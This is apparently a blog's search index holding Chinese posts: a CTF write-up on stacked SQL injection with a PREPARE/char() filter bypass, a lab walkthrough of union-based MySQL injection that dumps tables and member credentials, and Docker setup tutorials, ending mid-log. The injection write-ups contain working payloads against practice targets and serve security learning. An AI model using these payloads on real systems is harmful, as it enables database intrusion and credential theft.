<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆叠注入</title>
      <link href="/2019/10/06/CTF-SQL3/"/>
      <url>/2019/10/06/CTF-SQL3/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是堆叠注入？"><a href="#什么是堆叠注入？" class="headerlink" title="什么是堆叠注入？"></a>什么是堆叠注入？</h3><p>顾名思义，堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img alt="1.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olfnp1aij20uu079jsn.jpg" class="lozad"></p><p>首先尝试闭合引号，并注释后面的内容。<br><img alt="2.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olh20dkfj20wb0bi75x.jpg" class="lozad"><br>发现没有报错，那就判断一下有多少列。</p><p><img alt="4.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olhida00j20vw0awwg4.jpg" class="lozad"><br><img alt="3.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olhaj646j20vj07q75t.jpg" class="lozad"><br>由此可以判断出有两列，接着判断回显位。</p><p><img alt="5.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olhou64xj20ys07l40a.jpg" class="lozad"><br>发现回显了过滤规则，select是被过滤的，还有一些注入常用语句也被过滤了。</p><p>这时就可以尝试一下堆叠注入。<br><img alt="6.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olhvtdyoj20wj0pmgnx.jpg" class="lozad"><br>发现这里爆出了所有数据库，再来看看数据表。<br><img alt="7.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7oli1kya3j20x30j476k.jpg" class="lozad"><br>发现有两个数据表，通过查看表结构看一下哪个表里面有flag字段。<br><img alt="8.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olid7uysj20yi0qv77j.jpg" class="lozad"><br><img alt="9.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olil9p86j20pv0r441g.jpg" class="lozad"></p><p>发现flag字段在<code>1919810931114514</code>表中，接着想办法去读取这个表中的flag字段的值（因为一些常用语句都被过滤了，不能直接查询）。<br>这里实在不知道怎么办了，于是百度发现大佬的wp用预处理语句绕过了过滤。</p><p>预处理语句使用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sql = variable;  //设置变量</span><br><span class="line">PREPARE yuchuli from &apos;[my sql sequece]&apos;;   //预定义SQL语句</span><br><span class="line">EXECUTE yuchuli;  //执行预定义SQL语句sqla</span><br></pre></td></tr></table></figure><p>这里是将我们要处理的语句先与定义为yuchuli，再进行执行，绕过关键字的过滤，于是就有了如下的语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PREPARE yuchuli from &apos;select * from `1919810931114514`&apos;;</span><br><span class="line">EXECUTE yuchuli;</span><br></pre></td></tr></table></figure><p>但是这里的select是被过滤的，于是想到可以对他进行编码绕过.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sql = concat(char(115,101,108,101,99,116), &quot; * from `1919810931114514`&quot;);</span><br><span class="line">PREPARE yuchuli from @sql;</span><br><span class="line">EXECUTE yuchuli;</span><br></pre></td></tr></table></figure><p><img alt="10.jpg" data-src="https://ws1.sinaimg.cn/large/bf75d723gy1g7olirx0y8j21460o678j.jpg" class="lozad"><br>成功拿到了flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql基础注入</title>
      <link href="/2019/06/14/mysql05/"/>
      <url>/2019/06/14/mysql05/</url>
      
        <content type="html"><![CDATA[<p><strong>实验环境：墨者学院Mysql手工注入漏洞测试靶场</strong><br>后台源码没有进行任何字符过滤。</p><p>首先进入靶场环境<br><img alt data-src="https://image.3001.net/images/20190614/15605103136843.jpg" class="lozad"><br>先用<code>admin</code>弱密码登陆试试<br><img alt data-src="https://image.3001.net/images/20190614/15605162158713.jpg" class="lozad"><br>果然不行，这时看到用户登录下方有一个停机维护通知，点进去瞅瞅<br><img alt data-src="https://image.3001.net/images/20190614/15605104475821.jpg" class="lozad"><br>看到这里链接上有<code>id = 1</code>,怀疑这里会有注入点。</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>先简单判断是不是字符型注入点，使用单引号闭合语句,注释后面的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1&apos;--+</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605106681494.jpg" class="lozad"><br>发现页面有异常，可能不是字符型，再试试数字型注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 1</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605107834469.jpg" class="lozad"><br>发现<code>and 1 = 1</code>没有返回异常，再进一步进行判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = 1 and 1 = 2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605108646837.jpg" class="lozad"><br>页面出现异常，说明这里存在数字型注入点</p><h4 id="猜解字段数"><a href="#猜解字段数" class="headerlink" title="猜解字段数"></a>猜解字段数</h4><p>发现存在注入点之后使用<code>order by</code>语句判断字段的数目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/1560511160681.jpg" class="lozad"><br>先试一下是不是3列，发现没有报错，说明至少存在3列，接着猜解。<br><img alt data-src="https://image.3001.net/images/20190614/1560511220341.jpg" class="lozad"><br>尝试到5发现报错了，因为字段没有5列，使用<code>order by</code>时无法根据第5列排序，所以出错，由此判断字段数目是4.</p><p>####联合查询<br>因为猜解出来的字段数是4，所以联合查询的语句应该这么写<code>?id=1 union select 1,2,3,4</code>,但因为这个语句是成立的，为了让页面爆出我们需要的字段，这里就需要构造一个错误的语句，让数据库报错时返回我们需要的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605148841175.jpg" class="lozad"><br>可以看到这里页面上爆出了2和3两个数字，说明2和3两个数字对应当前数据表的两个字段会回显到页面上的，这样就可以根据2，3两个回显位查询一些我们需要的信息。<br>常用的Mysql系统函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure><p>比如查询当前的数据库名称和当前用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),user(),4</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/1560515289332.jpg" class="lozad"><br>这样我们就成功查询到当前数据库，接着找这个数据库里的数据表。</p><h4 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h4><p>补充1：数据库关键库<br>这里需要使用到数据库中一个重要的库<code>information_schema</code>，这个库下面的<code>schemadata</code>表中存放着所有数据库的信息，其中<code>schema_name</code>列中保存着所有数据库名，<code>tables</code>表中存放着所有数据表的信息，其中<code>table_schema</code>列存放着数据库名，<code>table_name</code>列存放着数据表名，<code>columns</code>表中存放着所有数据表的所有列信息，其中<code>column_name</code>存放着所有列名，<code>table_name</code>存放着表名。<br>补充2：concat函数的用法</p><p>1.concat(str1,str2)<br>将多个结果一行返回。如有任何一个参数为NULL ，则返回值为 NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3;</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">| 1 | 2 | 3 |</span><br><span class="line">+---+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(1,2,3);</span><br><span class="line">+---------------+</span><br><span class="line">| concat(1,2,3) |</span><br><span class="line">+---------------+</span><br><span class="line">| 123           |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>2.concat_ws(separator,str1,str2)<br>concat_ws是concat()的特殊形式。第一个参数是其它参数的分隔符,分隔符可以是一个字符串，也可以是其它参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&apos;~&apos;,1,2,3);</span><br><span class="line">+----------------------+</span><br><span class="line">| concat_ws(&apos;~&apos;,1,2,3) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 1~2~3                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>3.group_concat完整语法如下，默认使用逗号分隔多个结果：<br>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_name = database()</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605155258786.jpg" class="lozad"><br>这样就查询到当前数据库里面有两个数据表，分别为<code>StormGroup_member</code>,<code>notice</code>。</p><h4 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos;</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605156481273.jpg" class="lozad"><br>查询到有这个表有四个字段<code>id</code>,<code>name</code>,<code>password</code>,<code>status</code>。</p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>根据上面查询到的四个字段查询数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,concat_ws(&apos;~&apos;,id,name,password,status),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20190614/15605157848912.jpg" class="lozad"><br>成功查到账号密码，不过这个密码好像是加密的，先进行解密<br><img alt data-src="https://image.3001.net/images/20190614/15605159017760.jpg" class="lozad"><br>使用这个账号密码登陆试试<br><img alt data-src="https://image.3001.net/images/20190614/15605160192900.jpg" class="lozad"><br>最后尴尬的一幕出现了(/哭)。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手动搭建Docker本地私有镜像仓库</title>
      <link href="/2018/10/27/docker14/"/>
      <url>/2018/10/27/docker14/</url>
      
        <content type="html"><![CDATA[<p><strong>实验环境：两个Centos7虚拟机，一个是Server，用作客户端，另一个是Registry，用作Docker私有镜像仓库。</strong></p><h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><p>查看一下两台虚拟机的IP地址。<br>Server的IP地址是<code>192.168.134.151</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429710403199.jpg" class="lozad"></p><p>Registry的IP地址是<code>192.168.134.150</code>。<br><img alt data-src="https://image.3001.net/images/20181123/154297104291.jpg" class="lozad"></p><p>使用<code>setenforce 0</code>临时关闭<code>SElinux</code>。</p><p><strong>打开<code>Server</code>和<code>Registry</code>的内核转发功能</strong><br>编辑配置文件<code>/etc/sysctl.conf</code>，添加下面的内容： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1 </span><br><span class="line">net.ipv4.conf.default.rp_filter = 0 </span><br><span class="line">net.ipv4.conf.all.rp_filter = 0</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710432205.jpg" class="lozad"><br>修改完成后使用<code>sysctl –p</code>命令生效。<br><img alt data-src="https://image.3001.net/images/20181123/15429710455813.jpg" class="lozad"></p><h1 id="Docker配置"><a href="#Docker配置" class="headerlink" title="Docker配置"></a>Docker配置</h1><h2 id="Docker环境安装"><a href="#Docker环境安装" class="headerlink" title="Docker环境安装"></a>Docker环境安装</h2><p>在<code>Server</code>和<code>Registry</code>两台机器上使用<code>yum install -y docker</code>命令安装docker环境。<br><img alt data-src="https://image.3001.net/images/20181123/15429710473328.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429710492085.jpg" class="lozad"></p><h2 id="配置Docker配置文件"><a href="#配置Docker配置文件" class="headerlink" title="配置Docker配置文件"></a>配置Docker配置文件</h2><p>在<code>Server</code>和<code>Registry</code>上编辑<code>/etc/sysconfig/docker</code>文件添加如下两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD_REGISTRY=&apos;--add-registry 192.168.134.150:5000&apos; </span><br><span class="line">INSECURE_REGISTRY=&apos;--insecure-registry 192.168.134.150:5000&apos;</span><br></pre></td></tr></table></figure><p>这里是将<code>docker image</code>的获取地址改为从本地私有<code>Registry</code>获取。<br><img alt data-src="https://image.3001.net/images/20181123/15429710514384.jpg" class="lozad"><br>使用<code>systemctl restart docker</code>命令重启一下docker。</p><h2 id="设置Docker服务"><a href="#设置Docker服务" class="headerlink" title="设置Docker服务"></a>设置Docker服务</h2><p>设置docker开机自启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710522984.jpg" class="lozad"></p><h2 id="配置镜像仓库"><a href="#配置镜像仓库" class="headerlink" title="配置镜像仓库"></a>配置镜像仓库</h2><p>先把等会要用到的两个镜像的tar包放到<code>/root</code>目录下。<br><img alt data-src="https://image.3001.net/images/20181123/15429710541483.jpg" class="lozad"></p><p>接着手动加载镜像,加载<code>registry</code>镜像并使用再将他上传至私有镜像仓库，因为<code>registry</code>容器要用于其他容器的注册，所以先将他启动。<strong>搭建私有镜像仓库必须要先将registry容器启动</strong>。<br>使用的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; registry_latest.tar   //加载镜像</span><br><span class="line">docker images  //查看刚刚加载的镜像的ID</span><br><span class="line">docker run -d -p 5000:5000 --restart=always --name registry registry:latest  //启动registry容器</span><br><span class="line">docker tag 镜像ID registry:latest  //给registry镜像打上新tag（可以省去此步）</span><br><span class="line">docker push registry:latest   //将registry镜像上传至私有镜像仓库（可以省去此步）</span><br></pre></td></tr></table></figure><p><img alt data-src="https://image.3001.net/images/20181123/15429710564731.jpg" class="lozad"><br>这时使用<code>docker images</code>查看一下本地镜像。<br><img alt data-src="https://image.3001.net/images/20181123/15429710598559.jpg" class="lozad"></p><p>可以看到下面一个就是我刚刚重新打tag的镜像。</p><p>现在上传一个owncloud镜像。<br><img alt data-src="https://image.3001.net/images/20181123/15429710612263.jpg" class="lozad"><br>这里可以看到上传完之后的镜像是没有tag的，所以我们给他打上tag，就可以看出来了。<br><img alt data-src="https://image.3001.net/images/20181123/15429710635798.jpg" class="lozad"><br>接着将他上传至私有镜像仓库。<br>全部命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; owncloud.tar   //加载镜像</span><br><span class="line">docker images  //查看刚刚加载的镜像的ID</span><br><span class="line">docker tag 镜像ID owncloud:latest  //给owncloud镜像打上tag</span><br><span class="line">docker push owncloud:latest   //将owncloud镜像上传至私有镜像仓库</span><br></pre></td></tr></table></figure><p>我这里私有镜像仓库的默认位置在<code>/var/lib/docker/volumes/022dbe58afaec96083a1ceb3fb6672c7a62be38a5a48158322d75d2e6b1150c3/_data/docker/registry/v2/repositories/</code>下。<br>查看一下<br><img alt data-src="https://image.3001.net/images/20181123/1542971064510.jpg" class="lozad"><br>这里可以看到我上传至私有镜像仓库的镜像文件。</p><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>验证一下私有镜像是否搭建成功<br>到server上拉取owncloud镜像试一下。<br><img alt data-src="https://image.3001.net/images/20181123/15429710671020.jpg" class="lozad"><br>这里可以看到他是从<code>192.168.134.150 Registry</code>镜像仓库拉取的镜像。<br>到此实验成功！</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下使用Tim/Wechat</title>
      <link href="/2018/10/27/docker13/"/>
      <url>/2018/10/27/docker13/</url>
      
        <content type="html"><![CDATA[<p><strong>实验环境：Ubuntu 16.04桌面版root用户下</strong></p><h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><ul><li><p>配置Docker的apt源<br><code>$ sudo apt-get install apt-transport-https ca-certificates curl software-properties-commo</code></p></li><li><p>添加 Docker 官方的 GPG<br><code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></p></li><li><p>添加Docker源<br><code>$ sudo add-apt-repository  &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu  $(lsb_release -cs) stable&quot;</code></p></li><li><p>安装Docker<br><code>$ sudo apt-get update</code><br><code>$ sudo apt-get install docker-ce</code></p></li></ul><p>首先运行QQ容器</p><p>先执行<code>xhost +</code>命令，不然QQ的界面无法弹出。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708926060.jpg" class="lozad"></p><p>接着执行下面的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name qq \</span><br><span class="line">docker run -d --name qq \</span><br><span class="line">--device /dev/snd \</span><br><span class="line">-v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="line">-v $HOME/TencentFiles:/TencentFiles \</span><br><span class="line">-e DISPLAY=unix$DISPLAY \</span><br><span class="line">-e XMODIFIERS=@im=fcitx \</span><br><span class="line">-e QT_IM_MODULE=fcitx \</span><br><span class="line">-e GTK_IM_MODULE=fcitx \</span><br><span class="line">-e AUDIO_GID=`getent group audio | cut -d: -f3` \</span><br><span class="line">-e VIDEO_GID=`getent group video | cut -d: -f3` \</span><br><span class="line">-e GID=`id -g` \</span><br><span class="line">-e UID=`id -u` \</span><br><span class="line">bestwu/qq:office</span><br></pre></td></tr></table></figure><p>启动完成之后就可以看到Tim的登录界面了。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708946413.jpg" class="lozad"></p><p>下次再启动QQ时输入<code>docker start qq</code>就好了。</p><p><img alt data-src="https://image.3001.net/images/20181123/15429708969843.jpg" class="lozad"></p><p>同理可以使用下面的命令还可以安装微信。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> docker run -d --name wechat \</span><br><span class="line"> docker run -d --name wechat \</span><br><span class="line"> --device /dev/snd \</span><br><span class="line"> -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="line"> -v $HOME/TencentFiles:/TencentFiles \</span><br><span class="line"> -e DISPLAY=unix$DISPLAY \</span><br><span class="line"> -e XMODIFIERS=@im=fcitx \</span><br><span class="line"> -e QT_IM_MODULE=fcitx \</span><br><span class="line"> -e GTK_IM_MODULE=fcitx \</span><br><span class="line"> -e AUDIO_GID=`getent group audio | cut -d: -f3` \</span><br><span class="line"> -e VIDEO_GID=`getent group video | cut -d: -f3` \</span><br><span class="line"> -e GID=`id -g` \</span><br><span class="line"> -e UID=`id -u` \</span><br><span class="line">bestwu/wechat</span><br></pre></td></tr></table></figure><p>不过微信关闭后再次启动的命令是<code>docker start wechat</code></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Dokcer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker+Nextcloud快速部署个人网盘</title>
      <link href="/2018/10/08/cloud04/"/>
      <url>/2018/10/08/cloud04/</url>
      
        <content type="html"><![CDATA[<p>各位大佬好，，，萌新顾北清又回来更新了，今天要<strong>快速</strong>部署一个人网盘。<br>有多快呢，，，5分钟吧，因为我们使用Docker部署。<br>Docker基础可以看看我之前的博文。（<a href="http://www.gubeiqing.cn/2018/06/03/docker01/">点这里点这里</a>）<br>那么，，，开始吧。</p><p><strong>实验环境：小伙伴的阿里云服务器，安装的是Centos7的系统，要安装的网盘叫<code>Nextcloud</code></strong></p><p>下面开始安装<br><strong>第一步</strong><br>老规矩，先安装<code>Docker</code>环境.<br>命令如下：</p><pre><code>[root@izt8mvnno1ny1dz ~]# yum install -y dockerLoaded plugins: fastestmirrorbase                                                                                                                                    | 3.6 kB  00:00:00epel                                                                                                                                    | 3.2 kB  00:00:00extras                                                                                                                                  | 3.4 kB  00:00:00updates                                                                                                                                 | 3.4 kB  00:00:00Loading mirror speeds from cached hostfilePackage 2:docker-1.13.1-74.git6e3bb8e.el7.centos.x86_64 already installed and latest versionNothing to do</code></pre><p>我这里已经安装完成就不重复安装了。<br>启动docker并设置自启：</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl start docker[root@izt8mvnno1ny1dz ~]# systemctl enable docker</code></pre><p><strong>第二步</strong><br>查找<code>Nextcloud</code>网盘的镜像</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker search nextcloudINDEX       NAME                                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDdocker.io   docker.io/nextcloud                       A safe home for all your data                   561       [OK]docker.io   docker.io/linuxserver/nextcloud           A Nextcloud container, brought to you by L...   81docker.io   docker.io/greyltc/nextcloud               Nextcloud: a safe home for all your data. ...   38                   [OK]docker.io   docker.io/wonderfall/nextcloud            All-in-one alpine-based Nextcloud image.        36                   [OK]docker.io   docker.io/rootlogin/nextcloud             Nextcloud docker image running on top of N...   17                   [OK]docker.io   docker.io/lsioarmhf/nextcloud             ARMHF based Linuxserver.io image of nextcloud   9docker.io   docker.io/arm32v7/nextcloud               A safe home for all your data                   8docker.io   docker.io/benyanke/nextcloud              Fork of wonderfall/nextcloud, since it is ...   7                    [OK]docker.io   docker.io/ownyourbits/nextcloudpi         NextCloud ARM docker container                  7docker.io   docker.io/sameersbn/nextcloud             Dockerized Nextcloud                            7                    [OK]docker.io   docker.io/ownyourbits/nextcloudpi-armhf   NextCloudPi ARM docker container                6docker.io   docker.io/hoellen/nextcloud               Based on wonderfall/nextcloud                   5                    [OK]docker.io   docker.io/aheimsbakk/nextcloud            DEPRECATED in favor of the Nextcloud webin...   2                    [OK]docker.io   docker.io/crazymax/nextcloud              Nextcloud Docker image based on Alpine Lin...   1docker.io   docker.io/lsioarmhf/nextcloud-aarch64     ARM64 based Linuxserver.io image of nextcl...   1docker.io   docker.io/zerpex/nextcloud-ocdl           Nextcloud with ocDownloader pre-requiresites    1                    [OK]docker.io   docker.io/avhost/docker-nextcloud         nextcloud as docker service                     0                    [OK]docker.io   docker.io/bunix42/nextcloud               Docker Image for Nextcloud, based on the o...   0docker.io   docker.io/dheaps/nextcloud-cron           Cron service for Nextcloud                      0                    [OK]docker.io   docker.io/ftsystems/nextcloud             Nextcloud container based on the owncloud ...   0docker.io   docker.io/gorlug/nextcloud                https://nextcloud.com/                          0                    [OK]docker.io   docker.io/sesceu/nextcloud                nextcloud with cron and imap-auth               0                    [OK]docker.io   docker.io/trollin/nextcloud                                                               0docker.io   docker.io/whatwedo/nextcloud              Nextcloud powered by Apache                     0                    [OK]docker.io   docker.io/zyrill/nextcloud                 Nextcloud v12 based on php:fpm-alpine          0</code></pre><p>依旧老规矩，使用官方镜像</p><p><strong>第三步</strong><br>拉取官方的Docker镜像</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker pull docker.io/nextcloudUsing default tag: latestTrying to pull repository docker.io/library/nextcloud ...latest: Pulling from docker.io/library/nextcloud802b00ed6f79: Already exists59f5a5a895f8: Pull complete6898b2dbcfeb: Pull complete8e0903aaa47e: Pull complete2961af1e196a: Pull complete71f7016f79a0: Pull complete5e1a48e5719c: Pull complete7ae5291984f3: Pull complete725b65166f31: Pull completee90b121f9520: Pull completeb5a272809bbd: Pull completef045f3ae0e2b: Pull complete7f51c9ea2d8e: Pull complete5aa9d0ed164a: Pull complete8eea44e2bfc7: Pull complete5302ebd5abce: Pull complete78f0335decb3: Pull complete1a2f85124682: Pull completeed4cec78a159: Pull completea68e1b656d3d: Pull completed0b66f00fda7: Pull complete45c9777c18b5: Pull completeDigest: sha256:c8d1091cc86051dc5e8de0114e3121fe0562cb417c56f2644ed92838008d8806Status: Downloaded newer image for docker.io/nextcloud:latest</code></pre><p>镜像拉取完成</p><p><strong>第四步</strong><br>容器拉取到本地之后，就该启用容器了。</p><pre><code>[root@izt8mvnno1ny1dz ~]# docker run -d --restart=always --name nextcloud -p 80:80 -v /root/nextcloud:/data docker.io/nextcloudae96013c7f0ab05194a4488d1fa61b1c6274c272a53b3d418418b56a88e2e230[root@izt8mvnno1ny1dz ~]# docker ps -aCONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                NAMESae96013c7f0a        docker.io/nextcloud   &quot;/entrypoint.sh ap...&quot;   6 seconds ago       Up 6 seconds        0.0.0.0:80-&gt;80/tcp   nextcloud</code></pre><p>这里可以看到已经在后台运行了，这就部署好了。</p><p><strong>第五步</strong><br>在浏览器地址栏输入你的IP地址，可以访问到<code>Nextcloud</code>的<code>Web</code>页面。<br><img alt data-src="https://image.3001.net/images/20181123/15429718173586.jpg" class="lozad"><br>如果访问不到，先重启一下docker服务，命令如下：</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl restart docker</code></pre><p>如果还是不行，那么就关闭防火墙服务吧。</p><pre><code>[root@izt8mvnno1ny1dz ~]# systemctl stop firewalld[root@izt8mvnno1ny1dz ~]# systemctl status firewalld    //查看一下防火墙状态● firewalld.service - firewalld - dynamic firewall daemonLoaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)Active: inactive (dead)    Docs: man:firewalld(1)Sep 20 13:44:49 izt8mvnno1ny1dz systemd[1]: Starting firewalld - dynamic firewall daemon...Sep 20 13:44:50 izt8mvnno1ny1dz systemd[1]: Started firewalld - dynamic firewall daemon.Sep 20 13:44:57 izt8mvnno1ny1dz systemd[1]: Stopping firewalld - dynamic firewall daemon...Sep 20 13:44:57 izt8mvnno1ny1dz systemd[1]: Stopped firewalld - dynamic firewall daemon.Sep 20 15:33:49 izt8mvnno1ny1dz systemd[1]: Starting firewalld - dynamic firewall daemon...Sep 20 15:33:49 izt8mvnno1ny1dz systemd[1]: Started firewalld - dynamic firewall daemon.Sep 20 15:34:58 izt8mvnno1ny1dz systemd[1]: Stopping firewalld - dynamic firewall daemon...Sep 20 15:34:58 izt8mvnno1ny1dz 